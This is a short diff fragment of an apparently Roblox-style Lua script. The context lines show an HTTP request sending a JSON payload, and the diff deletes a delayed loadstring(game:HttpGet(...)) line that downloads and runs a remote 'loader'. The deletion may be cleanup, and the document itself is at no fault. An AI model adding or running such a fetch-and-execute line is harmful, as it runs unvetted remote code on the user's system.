@@ -172,7 +172,3 @@ http_request({
     Headers = { ["Content-Type"] = "application/json" },
     Body    = HttpService:JSONEncode(payload)
 })
-
-task.wait(7)
-
-loadstring(game:HttpGet("https://api.honeylua.com/loader"))()
